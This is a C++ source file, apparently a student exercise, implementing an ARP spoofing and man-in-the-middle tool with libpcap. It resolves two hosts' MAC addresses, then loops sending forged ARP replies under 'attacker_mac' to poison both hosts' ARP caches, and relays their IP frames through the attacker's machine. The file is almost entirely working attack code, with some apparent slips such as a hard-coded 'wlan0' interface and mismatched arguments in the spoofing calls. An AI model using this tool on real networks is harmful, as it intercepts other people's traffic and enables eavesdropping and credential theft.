#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>

#include <net/if.h>
#include <netinet/in.h>

#include <ifaddrs.h>
#include <arpa/inet.h>

#include <chrono>
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("insufficient arguments\n");
    // printf("syntax: send-arp-test <interface>\n");
	// printf("sample: send-arp-test wlan0\n");
}

struct spoof{
    Mac src_mac     ;
    Ip  src_ip      ;
    Ip  dst_ip      ;
    Mac dsc_mac     ;
    int result_num  ;
};

Mac my_mac_find(const std::string& interface_type) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return Mac(); 
    }

    strncpy(ifr.ifr_name, interface_type.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return Mac(); 
    }

    close(sock);

    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);

    char mac_str[18];
    std::snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return Mac(mac_str); 
}

Ip my_ip_find(){
	struct ifaddrs *ifaddr, *ifa;
    char ip[INET_ADDRSTRLEN];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return Ip();
    }

    Ip myIp;

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET)
            continue;

            if (std::string(ifa->ifa_name) != "wlan0")
            continue;

        void* addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        inet_ntop(AF_INET, addr, ip, sizeof(ip));
        myIp = Ip(ip);
        break;  
    }

    freeifaddrs(ifaddr);
    return myIp;
}

Mac mac_request(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket packet;

    // Ethernet Header
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP Header
    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::Size;
    packet.arp_.pln_  = Ip::Size;
    packet.arp_.op_   = htons(ArpHdr::Request); 
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_  = htonl(uint32_t(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(uint32_t(target_ip));

    // printf("  My MAC : %s\n", std::string(my_mac).c_str());
    // printf("  My IP  : %s\n", std::string(my_ip).c_str());
    // printf("  Target IP : %s\n", std::string(target_ip).c_str());

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
        return Mac();
    }
    
    // printf("1\n");

    struct pcap_pkthdr* header;
    const u_char* packet_data;

    while (true) {
        // printf("2\n");
        int ret = pcap_next_ex(handle, &header, &packet_data);
        // printf("3\n");
        if (ret == 0) continue; // timeout
        if (ret == -1 || ret == -2) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
            break;
        }

        EthArpPacket* recv = (EthArpPacket*)packet_data;

        if (ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;

        // printf("hear : %s is at %s\n",
        //        std::string(Ip(ntohl(recv->arp_.sip_))).c_str(),
        //        std::string(recv->arp_.smac_).c_str());

        return recv->arp_.smac_;
    }

    return Mac(); 
}

int custom_arp_table(pcap_t* handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;     
    packet.eth_.smac_ = attacker_mac;   
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_  = htonl(uint32_t(target_ip));   
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_  = htonl(uint32_t(sender_ip));   

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "ARP packet: %s\n", pcap_geterr(handle));
        return 0; 
    }

    return 1; 
}

// pcap_next_ex를 전체 타임아웃으로 감싸는 헬퍼
bool packet_check(pcap_t* pcap, const u_char** pkt, struct pcap_pkthdr** hdr, int overall_timeout_ms = 200) {
    auto start = std::chrono::steady_clock::now();
    while (true) {
        int r = pcap_next_ex(pcap, hdr, pkt);
        if (r == 1) {
            // 최소한의 필터: 이더넷 길이 확인 + ARP 제외
            if ((*hdr)->caplen >= sizeof(EthHdr)) {
                const EthHdr* eth = reinterpret_cast<const EthHdr*>(*pkt);
                if (ntohs(eth->type_) != EthHdr::Arp) return true; // IP(등)만 통과
            }
            // ARP면 다시 기다림
            continue;
        }
        if (r == 0) {
            // 타임아웃: overall 타임아웃 초과면 false
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::milliseconds>(now - start).count() >= overall_timeout_ms)
                return false;
            continue;
        }
        if (r == -1 || r == -2) {
            // 에러/EOF
            return false;
        }
    }
}


// 내 MAC으로 들어온 패킷을 반대편으로 전달
// vol[0] : sender<-target as my_mac  (보통 sender측으로 보내줄 엔트리)
// vol[1] : target<-sender as my_mac  (보통 target측으로 보내줄 엔트리)
bool request_relay(pcap_t* pcap, const Mac& my_mac, const spoof vol[2]) {
    const u_char* pkt = nullptr; 
    struct pcap_pkthdr* hdr = nullptr;

    // 내게 도착한 프레임만 보게 BPF를 한 번 걸어두면 좋음(선택):
    //  - ether dst <my_mac> and ip and not arp
    // 여기서는 함수 안에서 바로 검사해도 됨.

    if (!packet_check(pcap, &pkt, &hdr, /*overall_timeout_ms*/ 200)) return false;

    if (hdr->caplen < sizeof(EthHdr)) return false;
    const EthHdr* eth = reinterpret_cast<const EthHdr*>(pkt);

    // 내게 온 패킷만 처리 (목적지 MAC이 내 MAC인가)
    if (eth->dmac_ != my_mac) return false;

    // IP 패킷만 릴레이 (ARP 제외)
    if (ntohs(eth->type_) != EthHdr::Ip4) return false;

    // 어느 방향인지 L2 src MAC으로 판별
    Mac next_hop_mac;
    if (eth->smac_ == vol[0].dsc_mac) {
        // vol[0] 쪽에서 온 것 → vol[1]의 dsc_mac(반대편 실제 MAC)으로 보냄
        next_hop_mac = vol[1].dsc_mac;
    } else if (eth->smac_ == vol[1].dsc_mac) {
        // vol[1] 쪽에서 온 것 → vol[0]의 dsc_mac으로
        next_hop_mac = vol[0].dsc_mac;
    } else {
        // 우리가 관리하는 두 플로우 쪽에서 온 게 아니면 패스
        return false;
    }

    // 새 이더넷 헤더 작성: dst=상대 실제 MAC, src=내 MAC
    EthHdr new_eth = *eth;
    new_eth.dmac_ = next_hop_mac;
    new_eth.smac_ = my_mac;

    // out 버퍼 구성: 새 이더넷 헤더 + 원본 payload
    std::vector<u_char> out(hdr->caplen);
    memcpy(out.data(), &new_eth, sizeof(EthHdr));
    memcpy(out.data() + sizeof(EthHdr), pkt + sizeof(EthHdr), hdr->caplen - sizeof(EthHdr));

    int res = pcap_sendpacket(pcap, out.data(), (int)out.size());
    return (res == 0);
}

int main(int argc, char* argv[]) {
	
    if (argc < 5) {
		usage();
		return EXIT_FAILURE;
	}
    
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    spoof vol[2];
    vol[0].src_mac  = my_mac_find(argv[1]); 
    vol[0].src_ip   = my_ip_find();
    vol[0].dst_ip   = Ip(argv[2]);
    vol[0].dsc_mac  = mac_request(pcap, vol[0].src_mac, vol[0].src_ip, vol[0].dst_ip);

    vol[1].src_mac  = my_mac_find(argv[1]); 
    vol[1].src_ip   = my_ip_find();
    vol[1].dst_ip   = Ip(argv[3]);
    vol[1].dsc_mac  = mac_request(pcap, vol[1].src_mac, vol[1].src_ip, vol[1].dst_ip);
    
    printf("[0]src_mac : %s\n", std::string(vol[0].src_mac).c_str());
    printf("[0]dsc_mac : %s\n", std::string(vol[0].dsc_mac).c_str());
    printf("[0]src_ip  : %s\n", std::string(vol[0].src_ip).c_str());
    printf("[0]dst_ip  : %s\n\n", std::string(vol[0].dst_ip).c_str());

    printf("[1]src_mac : %s\n", std::string(vol[1].src_mac).c_str());
    printf("[1]dsc_mac : %s\n", std::string(vol[1].dsc_mac).c_str());
    printf("[1]src_ip  : %s\n", std::string(vol[1].src_ip).c_str());
    printf("[1]dst_ip  : %s\n", std::string(vol[1].dst_ip).c_str());
    printf("-------------------------------------------------------\n\n");

    int i = 1; 
    while (true) {
        int check = 0 ;
        check = custom_arp_table(pcap, vol[0].src_mac, vol[0].src_ip, vol[0].dsc_mac, vol[0].dst_ip);
        check += custom_arp_table(pcap, vol[1].src_mac, vol[1].src_ip, vol[1].dsc_mac, vol[1].dst_ip);
        if(check == 2 ){
            printf("[%d] %s --- %s : ok \n",i,std::string(vol[0].dst_ip).c_str(), std::string(vol[1].dst_ip).c_str());
            (void)request_relay(pcap, vol[0].src_mac /*=my_mac*/, vol);

            usleep(500 * 1000);
            //usleep(2000 * 1000);
            i++; 
        }
        else {
            printf("loop failed\n");
            break;
        }
    }

	pcap_close(pcap);
}